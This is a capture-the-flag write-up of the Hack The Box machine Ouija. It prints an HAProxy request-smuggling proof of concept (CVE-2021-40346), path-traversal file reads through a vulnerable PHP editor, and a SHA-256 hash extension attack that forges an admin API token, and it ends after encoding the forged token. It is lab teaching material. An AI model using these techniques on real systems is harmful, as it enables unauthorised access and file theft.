---
title: HTB: Ouija
url: https://0xdf.gitlab.io/2024/05/18/htb-ouija.html
date: 2024-05-18T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-ouija, nmap, feroxbuster, burp, burp-proxy, subdomain, gitea, haproxy, cve-2021-40346, request-smuggling, integer-overflow, burp-repeater, file-read, proc, hash-extender, hash-extension, youtube, python, reverse-engineering, php-module, gdb, peda, ghidra, bof, arbitrary-write, htb-intense, htb-extension
---

![Ouija](/img/ouija-cover.png)

Ouija starts with a requests smuggling vulnerability that allows me to read from a dev site that’s meant to be blocked by HA Proxy. Access to the dev site leaks information about the API, enough that I can do a hash extension attack to get a working admin key for the API and abuse it to read files from the system. I’ll read an SSH key and get a foothold. From there, I’ll abuse a custom PHP module written in C and compiled into a .so file. There’s an integer overflow vulnerability which I’ll abuse to overwrite variables on the stack, providing arbitrary write as root on the system.

## Box Info

| Name | [Ouija](https://hackthebox.com/machines/ouija)  [Ouija](https://hackthebox.com/machines/ouija) [Play on HackTheBox](https://hackthebox.com/machines/ouija) |
| --- | --- |
| Release Date | [02 Dec 2023](https://twitter.com/hackthebox_eu/status/1730270485546508565) |
| Retire Date | 18 May 2024 |
| OS | Linux Linux |
| Base Points | ~~Hard [40]~~ Insane [50] |
| Rated Difficulty | Rated difficulty for Ouija |
| Radar Graph | Radar chart for Ouija |
| First Blood User | 02:40:41[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 17:50:57[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [kryptoskia kryptoskia](https://app.hackthebox.com/users/837661) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and HTTP (80, 3000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.244
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-12 21:22 EDT
Nmap scan report for 10.10.11.244
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
oxdf@hacky$ nmap -p 22,80,3000 -sCV 10.10.11.244
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-12 21:22 EDT
Nmap scan report for 10.10.11.244
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

### Website - TCP 80

#### Site

The website on TCP 80 is the default Ubuntu Apache2 page:

![image-20240514071041655](/img/image-20240514071041655.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it finds nothing:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.244

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.244
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      363l      961w    10671c http://10.10.11.244/
200      GET      258l      588w    15696c http://10.10.11.244/server-status
[####################] - 57s    30000/30000   0s      found:2       errors:0      
[####################] - 57s    30000/30000   518/s   http://10.10.11.244/ 

```

### ouija.htb - TCP 80

#### Site

HTB has moved away from players just assuming that `[boxname].htb` is the domain for the box in favor of always showing that to the HTB player in some way, but somehow in this box that got messed up. On adding `ouija.htb` to my `/etc/hosts` file, there’s a new site:

![image-20240514140406497](/img/image-20240514140406497.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s not much of interest here. All the links go to places on the same page. There’s an email, `info@ouija.htb` at the bottom. The contact form at the bottom has some client-side validation, but on clicking submit there’s a POST to `/contactform/contactform.php` that returns a 404.

One other thing to note is that on loading the page, because I have [configured Burp](https://www.youtube.com/watch?v=iTm33Miymdg) to capture all `.htb` requests, I’ll notice it’s loading two resources from `gitea.ouija.htb`:

![image-20240514141552416](/img/image-20240514141552416.png)

These requests are just hanging because there’s no DNS resolution.

#### Tech Stack

The main site loads as `index.html`. There is the missing `contactform.php` page, but I don’t think that is actually evidence that this is a PHP site (more likely it’s part of the template and wasn’t set up).

The HTTP response headers don’t show much else:

```

HTTP/1.1 200 OK
date: Tue, 14 May 2024 16:38:33 GMT
server: Apache/2.4.52 (Ubuntu)
last-modified: Tue, 21 Nov 2023 12:26:11 GMT
etag: "4661-60aa8b531fec0-gzip"
accept-ranges: bytes
vary: Accept-Encoding
Content-Length: 18017
content-type: text/html
connection: close

```

This seems like a static site to me.

#### Directory Brute Force

Even if I don’t think the site is PHP, I’ll add it to `feroxbuster` just in case:

```

oxdf@hacky$ feroxbuster -u http://ouija.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://ouija.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      410l     1325w    18017c http://ouija.htb/
301      GET        9l       28w      306c http://ouija.htb/admin => http://ouija.htb/admin/
301      GET        9l       28w      303c http://ouija.htb/js => http://ouija.htb/js/
301      GET        9l       28w      304c http://ouija.htb/lib => http://ouija.htb/lib/
403      GET        3l        8w       93c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      304c http://ouija.htb/css => http://ouija.htb/css/
301      GET        9l       28w      304c http://ouija.htb/img => http://ouija.htb/img/
301      GET        9l       28w      312c http://ouija.htb/contactform => http://ouija.htb/contactform/
200      GET      350l      749w    21906c http://ouija.htb/server-status
[####################] - 2m    210000/210000  0s      found:8       errors:0      
[####################] - 2m     30000/30000   248/s   http://ouija.htb/ 
[####################] - 1m     30000/30000   262/s   http://ouija.htb/admin/ 
[####################] - 0s     30000/30000   0/s     http://ouija.htb/js/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://ouija.htb/lib/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://ouija.htb/css/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://ouija.htb/img/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://ouija.htb/contactform/ => Directory listing (remove --dont-extract-links to scan)

```

`/admin/` returns a 403 forbidden.

### Subdomain Fuzz

Given the use of name-based routing, I’ll fuzz for other subdomains with `ffuf`:

```

oxdf@hacky$ ffuf -u http://10.10.11.244 -H "Host: FUZZ.ouija.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.244
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ouija.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

.htaccesswOslmDUB       [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev2                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devel                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
development             [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev1                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
develop                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev3                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
developer               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev01                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev4                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
developers              [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev5                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devtest                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev-www                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
devil                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev.m                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devadmin                [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev6                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev7                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev.www                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
devserver               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
devapi                  [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 94ms]
devdb                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 117ms]
devsite                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 108ms]
devwww                  [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev-api                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devel2                  [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 95ms]
devblog                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devon                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 96ms]
#www                    [Status: 400, Size: 303, Words: 26, Lines: 11, Duration: 94ms]
devmail                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 94ms]
devcms                  [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
dev10                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
#mail                   [Status: 400, Size: 303, Words: 26, Lines: 11, Duration: 100ms]
dev.admin               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 94ms]
dev.shop                [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev0                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 95ms]
dev02                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
deva                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
devils                  [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 93ms]
devsecure               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
dev-admin               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
deve                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 96ms]
devforum                [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 92ms]
:: Progress: [19966/19966] :: Job [1/1] :: 430 req/sec :: Duration: [0:00:51] :: Errors: 0 ::

```

There seems to be something blocking anything that starts with “dev”. That suggests some kind of proxy or WAF. And that `dev.ouija.htb` might be an interesting domain. I’ll update my `/etc/hosts`:

```
10.10.11.244 ouija.htb dev.ouija.htb gitea.ouija.htb

```

If I try to access `dev.ouija.htb`, it does return 403:

![image-20240516133437682](/img/image-20240516133437682.png)

The HTTP response headers don’t have the Apache `server` header:

```

HTTP/1.1 403 Forbidden
content-length: 93
cache-control: no-cache
content-type: text/html
connection: close

```

This further suggests that the request isn’t reaching Apache.

### gitea.ouija.htb - TCP 80

This is an instance of [Gitea](https://about.gitea.com/), the open-source hosted Git application. There’s an option to register, but all I need is available in the one public repo, `ouija-htb` from the leila user. The repo has the files for the main site:

![image-20240514142159087](/img/image-20240514142159087.png)

The `README.md` file gives the technology serving the site:

![image-20240514142104814](/img/image-20240514142104814.png)

HA-Proxy is probably what is blocking “dev\*”.

### API - TCP 3000

#### API

The HTTP server on 3000 is some kind of an API:

```

oxdf@hacky$ curl -v http://10.10.11.244:3000
*   Trying 10.10.11.244:3000...
* Connected to 10.10.11.244 (10.10.11.244) port 3000 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.244:3000
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 31
< ETag: W/"1f-gKMVcr/dSZNf3gkmiTCD5Te+lps"
< Date: Tue, 14 May 2024 11:21:52 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
* Connection #0 to host 10.10.11.244 left intact
"200 not found , redirect to ."

```

#### Brute Force

I’ll try to brute force paths on the API:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.244:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.244:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       31c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        5w       42c http://10.10.11.244:3000/login
200      GET        1l        1w       26c http://10.10.11.244:3000/register
200      GET        1l        4w       25c http://10.10.11.244:3000/users
200      GET        1l        5w       42c http://10.10.11.244:3000/Login
200      GET        1l        4w       25c http://10.10.11.244:3000/Users
200      GET        1l        1w       26c http://10.10.11.244:3000/Register
200      GET        1l        5w       42c http://10.10.11.244:3000/LOGIN
[####################] - 54s    30000/30000   0s      found:7       errors:2
[####################] - 54s    30000/30000   555/s   http://10.10.11.244:3000/

```

The `/register` endpoint says it’s “disabled”:

```

oxdf@hacky$ curl http://10.10.11.244:3000/register
{"message":"__disabled__"}

```

It looks like `/login` is disabled as well:

```

oxdf@hacky$ curl http://10.10.11.244:3000/login
{"message":"uname and upass are required"}
oxdf@hacky$ curl 'http://10.10.11.244:3000/login?uname=0xdf&upass=0xdf'
{"message":"disabled (under dev)"}

```

Visiting `/users` returns an error message:

```

oxdf@hacky$ curl http://10.10.11.244:3000/users
"ihash header is missing"

```

It seems to be using some kind of custom authentication scheme with an `ihash` header. This can be fuzzed a bit, but to no real value. I’ll return to this later.

## Shell as leila

### Access dev.ouija.htb

#### Identify CVE-2021-40346

There’s a request smuggling vulnerability in the version of HA Proxy mentioned in the instructions on Gitea:

![image-20240514143403601](/img/image-20240514143403601.png)

NVD says this is fixed in 2.2.16, but the [post from JFrog](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) (who found the vulnerability) says:

> This vulnerability was fixed in versions 2.0.25, 2.2.17, 2.3.14 and 2.4.4 of HAProxy.

NVD is just wrong on this one.

#### CVE-2021-40346 Background

The issue here is how HA Proxy handles requests in two stages with a POC like this:

```

POST /index.html HTTP/1.1
Host: abc.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60
 
GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz

```

For this example, HA Proxy is set up to block requests to `/admin/`.

HA Proxy parses this in two passes. In the first pass, it reaches the third line and parses it into a structure that has 1 byte for the header name length, and then the header name. Because this header is 270 bytes, there’s an overflow, as the binary for 270 is 100001110 (nine bits). As the struct can only hold 8, it stores 00001110, which is 14. The value of the header is stored in the same way. The length would be 0 (as there is no data after the “:”), but the extra 1 from the header name size actually ends up here, giving this header a length of 1, and a value of “0”. Still on the first pass, it see the `Content-Length` header of 60, and uses it to read the body to the end of the request.

On the next pass, HA Proxy passes over the struct and reached the malformed header which is now saved as 14 bytes long, so it matches “Content-Length”, with a value of “0” (1 byte long). The next header is ignored as a duplicate. So it forwards on this as a single request:

```

POST /index.html HTTP/1.1
host: abc.com
content-length: 0
x-forwarded-for: 192.168.188.1
 
GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz

```

When the client gets this, it reads the first request, understanding it to be 0 in length, and parses up to just before the “G”. Then it assumes this is another request, coming over the same connection, and processes it as well. This means the attack has successfully bypassed HA Proxy’s block on `/admin/`.

#### Smuggling POCs

To exploit this, I’ll send a request to `/` to Burp Repeater, and update the headers to look like the POC. I had to play with this *a lot* to get it working, and found that starting another request at the end made it *much* more stable. So it looks like this:

![image-20240514152505484](/img/image-20240514152505484.png)

The `Content-Length` is the distance from the start of the second request to the start of the third. That way the request sent from HA Proxy will cut off there. Having the third request seems to make it much more stable.

It’s very important to uncheck the Burp option to “Update Content-Length”, which it typically checked by default (and in each new repeater window):

![image-20240514152849388](/img/image-20240514152849388.png)

I’m targeting `gitea.ouija.htb` so that I can know what to expect if it’s successful.

When I send this, the response looks like the normal response for `ouija.htb`:

![image-20240514152943924](/img/image-20240514152943924.png)

However, towards the bottom:

![image-20240514153023042](/img/image-20240514153023042.png)

The second response is just appended to the first, and it got the Gitea site!

I’ll update the host in the second request from `gitea` to `dev`, and subtract two from the `Content-Length` to account for that:

![image-20240514153217718](/img/image-20240514153217718.png)

It returns `dev.ouija.htb`.

### Read dev.ouija.htb

#### Site Root

I can copy the HTML and open it in Firefox to see what it looks like:

![image-20240514153742872](/img/image-20240514153742872.png)

The CSS doesn’t load, but the general page is clear. The link to `app.js` is `http://dev.ouija.htb/editor.php?file=app.js`, and `init.sh` is the same path with an updated `file` argument.

#### Read Files

I’ll update the request and `Content-Length` again, and get `editor.php` with the `app.js` file, which shows the loaded file in a text field element:

![image-20240514154155175](/img/image-20240514154155175.png)

#### editor.php

I can read `editor.php` by getting `../editor.php`:

![image-20240514155517490](/img/image-20240514155517490.png)

The source is:

```

<?php ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Text Editor</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <h1>Text Editor</h1>

    <div class="container">
        <h3><?php

            if(isset($_GET['file'])) {
                echo $_GET['file'];
            } else {
                echo "No file selected";
            }

            ?></h3>
        <textarea name="content" id="content" cols="30" rows="10"><?php

            if(isset($_GET['file'])) {
                $filename = $_GET['file'];
                $url = "uploads/$filename";
                echo file_get_contents($url);
            } else {
                echo "Choose a file in order to edit it.";
            }

            ?></textarea>
        <button type="submit">Save</button>
    </div>
</body>
    <footer>
        &copy; 2023 ouija software
    </footer>
</html>

```

It can read any file on the host.

![image-20240514155725054](/img/image-20240514155725054.png)

But it’s a `file_get_contents`, not an `include`, so no execution from this (and not an LFI vulnerability).

### API Analysis

#### init.sh

`init.sh` is a Bash script that

```

#!/bin/bash

echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1

```

This script…is full of errors and wouldn’t actually do anything it’s claiming to do, but I’m going to try to learn from it anyway.

The most important things are the two environment variables, `botauth_id` and `hash`, which I’ll note. I can try to read `/opt/auth/api.key`, but it doesn’t return.

There’s also a symbolic link created in the init, putting `/proc` in the current directory.

I can try to use these two as headers requested by `/users` on the API:

```

oxdf@hacky$ curl 'http://10.10.11.244:3000/users'
"ihash header is missing"
oxdf@hacky$ curl 'http://10.10.11.244:3000/users' -H "ihash: 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
"identification header is missing"
oxdf@hacky$ curl 'http://10.10.11.244:3000/users' -H "ihash: 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1" -H "identification: bot1:bot"
"Invalid Token"

```

It doesn’t work. I’ll look at why in the source below.

#### app.js

The `app.js` file is the source code for the API on TCP 3000:

```

var express = require('express');
var app = express();
var crt = require('crypto');
var b85 = require('base85');
var fs = require('fs');
const key = process.env.k;

app.listen(3000, ()=>{ console.log("listening @ 3000"); });

function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}
function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}
function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}
function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

app.get("/login", (q,r,n) => {
    if(!q.query.uname || !q.query.upass){
        r.json({"message":"uname and upass are required"});
    }else{
        if(!q.query.uname || !q.query.upass){
            r.json({"message":"uname && upass are required"});
        }else{
            r.json({"message":"disabled (under dev)"});
        }
    }
});
app.get("/register", (q,r,n) => {r.json({"message":"__disabled__"});});
app.get("/users", (q,r,n) => {
    ensure_auth(q, r);
    r.json({"message":"Database unavailable"});
});
app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
app.get("/file/upload", (q,r,n) =>{r.json({"message":"Disabled for security reasons"});});
app.get("/*", (q,r,n) => {r.json("200 not found , redirect to .");});

```

This code is very clearly AI generated, as it does all sorts of silly things (like checking twice in the `/login` function if the arguments are provided).

The `/users` endpoint is disabled as well:

```

app.get("/users", (q,r,n) => {
    ensure_auth(q, r);
    r.json({"message":"Database unavailable"});
});

```

The function that is useful is `/file/read`:

```

app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});

```

While I already have file read on the `dev` site, this is likely running on a different host/container (as evidenced by the fact that the `/opt/auth/api.key` file isn’t on `dev`) and is worth pursuing.

#### ensure\_auth

This function has the same call to `ensure_auth` that `/users` has:

```

function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

```

There are four criteria:
- `ihash` and `identification` headers must exist;
- `verify_cookies` must return True;
- the decoded `identification` header must include `::admin:True`.

#### Pass Token Correctly

`verify_cookies` checks that the decoded (`d`) `identification` matches the `ihash` header:

```

function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}

```

`d` takes a string, base64 decodes it, and then hex decodes it:

```

function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}

```

So to use the token, I need to take the identifier, convert it to hex, and the base64 (something no reasonable programmer would ever do, but ok).

I can try that with the identifier and hash from `init.sh`:

```

oxdf@hacky$ echo -n "bot1:bot" | xxd -p | base64
NjI2Zjc0MzEzYTYyNmY3NAo=
oxdf@hacky$ curl 'http://10.10.11.244:3000/users' -H "ihash: 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1" -H "identification: NjI2Zjc0MzEzYTYyNmY3NAo="
"Insufficient Privileges"

```

That means I’ve got a valid token, it just doesn’t include `::admin:True`.

#### generate\_cookies

The `generate_cookies` function is where the hash is generated to be compared to the `ihash` header:

```

function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}

```

It takes a SHA256 hash of an unknown key plus the identifier and returns the hex hash. Without knowing the `key`, I can’t just calculate the hash for the identification I want.

### Hash Extension Attack

#### Background

There is a well known attack against a situation like this where there’s some unknown secret prepended to data and then hashed called a hash extension attack. The attack is against how hashes are calculated. Hashes take in any amount of data and return a fixed size fingerprint. To do that, they read in some block size, perform some calculations arriving at some state. Then they read in the next block, combine it with the previous state, and get a new state. Once all the data is read, the state is used to generate the fingerprint.

The attack is that I don’t have to know the data that went into the hash to recreate the state at the end from the hash. That means I can append additional data and work from that state to get the correct hash of the new data.

In summary, in a scenario where I have data and the hash of an unknown secret plus data, I can add more data to the end and calculate the new hash without knowing the original secret. I’ve shown this a few times before, with the [2021 Sans Holiday Hack Printer Firmware challenge](/holidayhack2021/7#reversing-firmware), as well as two HackTheBox machines, [Intense](/2020/11/14/htb-intense.html#hash-extender) and [Extension](/2023/03/18/htb-extension.html#hash-extension-attack).

#### hash\_extender

There’s a great tool for doing the hash extension attack, [hash\_extender](https://github.com/iagox86/hash_extender). The `README.md` has a lot of detail about how the attack works.

To use the tool, I need to give it:
- the current data
- the known good hash for that data plus secret
- the data I want to append
- the format of the hash
- the length of the secret

So for secret of length 8, I’ll run it and get:

```

oxdf@hacky$ ./hash_extender -data 'bot1:bot' --secret 8 --append '::admin:True' --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --format sha256
Type: sha256
Secret length: 8
New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000803a3a61646d696e3a54727565

```

I can base64 encode that and submit it:

```

oxdf@hacky$ echo -n 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000803a3a61646d696e3a54727565 | base64 -w0
NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA4MDNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
